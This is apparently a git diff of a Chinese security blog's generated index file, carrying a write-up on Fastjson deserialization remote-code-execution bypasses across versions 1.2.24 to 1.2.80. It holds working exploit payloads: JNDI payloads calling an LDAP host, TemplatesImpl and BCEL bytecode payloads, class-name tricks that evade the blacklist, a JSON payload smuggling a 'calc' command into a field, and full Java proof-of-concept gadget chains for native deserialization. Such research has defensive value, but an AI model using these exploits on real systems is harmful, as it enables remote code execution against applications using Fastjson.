class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fastjson在后续版本中将java.lang.Runnable、java.lang.Readable加入了黑名单，经测试这些类也是可以触发的，不过像这种把命令执行写到异常类的处理方式未免有些鸡肋，在实际开发场景中一般不会碰见，并且自1.2.68开始由于加了这段代码，jndi等利用方式也不再适用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">        || javax.sql.DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">        || javax.sql.RowSet.class.isAssignableFrom(clazz) <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是浅蓝师傅提出了写文件拿shell方式，具体可参考</p>
+<p><a href="https://su18.org/post/fastjson-1.2.68/">Fastjson 68 commons-io AutoCloseable </a></p>
+<h2 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson -1.2.80"></a>fastjson -1.2.80</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.80</p>
+<p>autotype：均可</p>
+<p>1.2.69开始，将AutoCloseable以hash的形式又又又又加入了黑名单，如果使用AutoCloseable，expectClassFlag的值会变为false，若此时默认关闭autotype功能则无法加载继承AutoCloseable的恶意类，这条路便无法走通了</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025164310188.png" alt="image-20231025164310188"></p>
+<p>但这次黑名单中并没有将Throwable加入黑名单，所以expectClass入参为Throwable的方式仍然可用，除此外更具突破性的应该是师傅们挖掘的对于特殊依赖的利用链</p>
+<p>gadget:</p>
+<p><a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p>
+<p><a href="https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf">https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf</a></p>
+<p>1.2.83版本彻底将期望类ban掉了，并且在添加mapping缓存时也加了一层autotype判断</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025182245454.png" alt="image-20231025182245454"></p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025182400394.png" alt="image-20231025182400394"></p>
+<ol>
+<li><a href="https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d">https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d</a></li>
+<li><a href="https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15">https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15</a></li>
+</ol>
+<p>通过parseObject()触发利用的方式得到了暂时的修复，但通过fastjson 原生反序列化仍存在相应的利用绕过方式</p>
+<h1 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h1><h2 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson &lt; 1.2.49"></a>fastjson &lt; 1.2.49</h2><p>fastjson中有两个类实现了Serializable接口，分别是<code>JSONArray</code>和<code>JSONObject</code>，并且他们都继承于JSON类</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231026114131702.png" alt="image-20231026114131702"></p>
+<p>而在JSON类中，有一个toString方法，会调用toJSONString()，toJSONString()又会调用指定类的getter方法</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231026114410826.png" alt="image-20231026114410826"></p>
+<p>但fastjson组件中没有重写<code>readObject()</code>，所以就要借助其它类的readObject类进行拼接，调用toString直接可以想到现有的链BadAttributeValueExpException，整条调用链也就出来了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject() —&gt; </span><br><span class="line">JSON.toString() —&gt;  </span><br><span class="line">TemplatesImpl.getOutputProperties() —&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>POC:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDeser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;S1nJa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray= <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serilize = serilize(badAttributeValueExpException);</span><br><span class="line">        unserilize(serilize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serilize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o, String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Exec.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson-≥-1-2-49"><a href="#fastjson-≥-1-2-49" class="headerlink" title="fastjson ≥ 1.2.49"></a>fastjson ≥ 1.2.49</h2><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>自1.2.49开始，fastjson实现了自己的<code>readObject()</code>类，它定义了<code>SecureObjectInputStream()</code>方法</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027110540708.png" alt="image-20231027110540708"></p>
+<p>封装完secIn对象后，会调用到<code>secIn.defaultReadObject();</code>，会走到JSON类重写的<code>resolveClass()</code>方法，调用<code>checkAutoType()</code>方法进行黑名单检测，所以Templates加载字节码的方式就会被check掉</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027111426348.png" alt="image-20231027111426348"></p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>但这种方式并不是安全的，因为这里的反序列化过程是：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject -&gt; SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>
+
+<p>相当于在ObjectInputStream套了个SecureObjectInputStream进行检测</p>
+<p>而正常流程应该是生成一个继承ObjectInputStream的类并重写resolveClass，由它来做反序列化的入口，这样才是安全的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">继承类 -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>
+
+<p>既然这样，就需要考虑如何绕过<code>resolveClass()</code>解析，了解反序列化流程的话应该知道</p>
+<p><code>readObject0()</code>的switch语句中，会走到<code>TC_OBJECT</code>处理对象，调用<code>readOrdinaryObject()</code>，其中会调用<code>readClassDesc()</code>读取类描述符，最后调用<code>readNonProxyDesc()</code>，调用到<code>resolveClass()</code>，具体流程可以参考之前文章<a href="https://s1nja.github.io/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/">defaultReadObject分析 | S1nJa’s Blog</a></p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027114826853.png" alt="image-20231027114826853"></p>
+<p>所以想要不执行<code>resolveClass</code>就要考虑如何才能不执行<code>readClassDesc()</code>，而<code>switch</code>语句中有这么几个分支不会走到该方法<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code></p>
+<p>其中TC_REFERENCE是引用类型，如果一个对象被多次引用，那么只会在第一次出现时进行完整地反序列化，而后面的引用将使用 TC_REFERENCE 进行标记</p>
+<p>因此在调用时，往List、set、map类型中添加同样对象即可成功利用，即：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//List</span></span><br><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//set</span></span><br><span class="line">Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//map</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(templates,badAttributeValueExpException);</span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDeser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;S1nJa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(templates);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray= <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        set.add(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] serilize = serilize(set);</span><br><span class="line">        unserilize(serilize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serilize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o, String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Exec.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>defaultReadObject分析</title>
     <url>/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>起因是想重新了解下反序列化，在看HashMap的readObject时，看到了defaultReadObject()，想到在重写readOject()中基本都遇到过，于是想了解下这个函数的具体作用以及实现原理。</p>
@@ -239,248 +481,6 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fastjson 看我一命通关</title>
-    <url>/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​        Fastjson是一款由阿里巴巴开发的高性能、功能丰富的 JSON 处理库，用于实现Java 对象和 JSON 字符串的转换。而Fastjson组件提供的反序列化功能，允许用户通过”@type” 字段来指定任意反序列化类名，并自动调用该类的 setter 方法及部分 getter 方法，这就导致当反序列化不可信数据时便可触发远程代码执行。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson -1.2.24"></a>fastjson -1.2.24</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.24</p>
-<p>主要利用方式为：</p>
-<ul>
-<li>JdbcRowSetImpl 结合JNDI注入</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>TemplatesImpl 动态加载字节码</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line">	<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;S1nJa&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">	<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>BasicDataSource 不出网利用</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>具体利用过程就不在赘述了，主要看下其他版本的绕过方式和利用思路。</p>
-<h2 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson -1.2.25"></a>fastjson -1.2.25</h2><p>在1.2.25版本中，官方引入了一个安全机制<code>checkAutoType</code>，主要进行了黑白名单检测，上述利用方式都被加入到了黑名单中</p>
-<ul>
-<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41</li>
-<li>autotype：开启</li>
-</ul>
-<h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h3><p>其中有这三个属性，分别代表是否开启checkAutoType和黑白名单，autoTypeSupport默认为false</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023144815106.png" alt="image-20231023144815106"></p>
-<p>接着就看下<code>checkAutoType</code>具体做了什么，之前的版本中是通过TypeUtils.loadClass直接加载我们传入的类，并通过deserialze进行反序列化</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023140209718.png" alt="image-20231023140209718"></p>
-<p>1.2.25开始加入了checkAutoType进行安全检测</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023140809796.png" alt="image-20231023140809796"></p>
-<h4 id="开启AutoType"><a href="#开启AutoType" class="headerlink" title="开启AutoType"></a>开启AutoType</h4><p>开启autoType的模式下先进行白名单检测如果有就直接加载，没有在进行黑名单检测，不在黑名单的话会从mapping缓存中查找</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023145135164.png" alt="image-20231023145135164"></p>
-<p>最后如果还没有则会直接加载</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="关闭AutoType"><a href="#关闭AutoType" class="headerlink" title="关闭AutoType"></a>关闭AutoType</h4><p>关闭的逻辑是先黑再白，如果还是找不到就抛出异常</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023145554242.png" alt="image-20231023145554242"></p>
-<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>JdbcRowSetImpl、TemplatesImpl、BCEL(sun包下的所有内容)都被加入了黑名单，看似无法再使用，但在loadClass的逻辑中发现这么一段代码：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果类名以L 开头; 结尾，则会递归的去除该符号，而这就出现了一个逻辑漏洞，<code>com.sun.*</code>被加入了黑名单，但是<code>Lcom.sun.*;</code>并没有，利用这个机制就可以绕过黑名单检测</p>
-<p>而这需要开启autotype，在上边的逻辑中有提到，如果黑白名单和mapping缓存中都没有该类则会调用如下代码直接加载</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>若没有开启autotype黑白名单中没有则会直接抛出异常</p>
-<p>最终的 payload 在类名前后加上<code>L</code>和<code>;</code>即可：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson -1.2.42"></a>fastjson -1.2.42</h2><ul>
-<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42</li>
-<li>autotype：开启</li>
-</ul>
-<p>自1.2.42开始，checkAutoType做了两个变化：</p>
-<p>1、黑名单采用hash形式，防止安全人员对其研究。不过很多都已经被师傅们撞出来了:<a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a></p>
-<img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023151856492.png" alt="image-20231023151856492" style="zoom: 67%;">
-
-<p>2、在开头部分加了L和;判断</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023152207413.png" alt="image-20231023152207413"></p>
-<p>这种方式只是表面上防止了L开头;结尾的情况，但loadClass中的逻辑是递归解析，所以这里双写绕过即可：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson -1.2.43"></a>fastjson -1.2.43</h2><ul>
-<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</li>
-<li>autotype：开启</li>
-</ul>
-<p>自1.2.43开始，又对之前的漏洞进行了修复，这次修复的方式为：如果出现LL则直接抛出异常</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023153431821.png" alt="image-20231023153431821"></p>
-<p>但loadClass中还有另一段逻辑：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果以[开头，也会进行截断解析，所以便可构造Payload：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但遇到报错:</p>
-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023160059692.png" alt="image-20231023160059692"></p>
-<h3 id="畸形payload"><a href="#畸形payload" class="headerlink" title="畸形payload"></a>畸形payload</h3><p>上边报错希望42行的位置是[，但却是逗号，所以加上[</p>
